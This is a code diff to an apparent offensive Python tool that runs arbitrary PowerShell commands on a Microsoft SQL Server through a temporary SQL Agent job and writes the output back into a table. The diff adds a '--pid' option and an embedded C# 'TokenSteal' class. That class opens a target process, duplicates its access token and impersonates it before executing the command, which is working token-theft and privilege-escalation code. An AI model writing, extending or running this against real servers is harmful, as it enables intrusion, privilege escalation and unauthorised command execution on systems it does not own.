@@ -9,7 +9,7 @@ import string
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase, k=length))
 
-def execute_command(server, username, password, database, command):
+def execute_command(server, username, password, database, command, pid=None):
     job_name = f"tmp_{random_string()}"
     table_name = f"tmp_{random_string()}"
     if ':' in server:
@@ -34,7 +34,54 @@ def execute_command(server, username, password, database, command):
         conn.commit()
         
         # PowerShell script that runs command and inserts to SQL
-        ps_script = f"""
+        if pid:
+            # Wrap command in PowerShell script that outputs to file
+            output_file = f"C:\\Windows\\Temp\\{random_string()}.txt"
+            ps_command_wrapper = f"powershell.exe -NoProfile -Command ''{command} 2>&1 | Out-File -FilePath {output_file} -Encoding UTF8''"
+            
+            ps_script = f"""
+$code = @''
+using System;
+using System.Runtime.InteropServices;
+public class TokenSteal {{
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+}}
+''@
+Add-Type -TypeDefinition $code
+$tmpFile = "C:\\Windows\\Temp\\{random_string()}.txt"
+try {{
+    $hProcess = [TokenSteal]::OpenProcess(0x0400, $false, {pid})
+    $hToken = [IntPtr]::Zero
+    [TokenSteal]::OpenProcessToken($hProcess, 0x0006, [ref]$hToken)
+    $hDupToken = [IntPtr]::Zero
+    [TokenSteal]::DuplicateTokenEx($hToken, 0x02000000, [IntPtr]::Zero, 2, 1, [ref]$hDupToken)
+    [TokenSteal]::ImpersonateLoggedOnUser($hDupToken)
+    {command} 2>&1 | Out-File -FilePath $tmpFile -Encoding UTF8
+}} catch {{
+    "Error: $_" | Out-File -FilePath $tmpFile -Encoding UTF8
+}}
+$output = Get-Content $tmpFile -Raw
+Remove-Item $tmpFile -Force
+$connString = "Server=localhost,{port};Database={database};Integrated Security=True;"
+$conn = New-Object System.Data.SqlClient.SqlConnection($connString)
+$conn.Open()
+$cmd = $conn.CreateCommand()
+$cmd.CommandText = "INSERT INTO {table_name} (output) VALUES (@output)"
+$param = New-Object System.Data.SqlClient.SqlParameter("@output", [System.Data.SqlDbType]::NVarChar, -1)
+$param.Value = $output
+$cmd.Parameters.Add($param) | Out-Null
+$cmd.ExecuteNonQuery() | Out-Null
+$conn.Close()
+"""
+        else:
+            ps_script = f"""
 $output = & {{ {command} }} | Out-String
 $connString = "Server=localhost,{port};Database={database};Integrated Security=True;"
 $conn = New-Object System.Data.SqlClient.SqlConnection($connString)
@@ -47,7 +94,7 @@ $cmd.Parameters.Add($param) | Out-Null
 $cmd.ExecuteNonQuery() | Out-Null
 $conn.Close()
 """
-        
+
         # Create job with PowerShell subsystem
         print(f"[+] Creating job {job_name}")
         cursor.execute(f"""
@@ -180,7 +227,8 @@ if __name__ == "__main__":
     parser.add_argument('-p', '--password', required=True, help='Password')
     parser.add_argument('-d', '--database', default='master', help='Database (default: master)')
     parser.add_argument('-c', '--command', required=True, help='PowerShell command to execute')
+    parser.add_argument('--pid', type=int, help='PID to steal token from (optional)')
     
     args = parser.parse_args()
     
-    execute_command(args.server, args.username, args.password, args.database, args.command)
+    execute_command(args.server, args.username, args.password, args.database, args.command, args.pid)
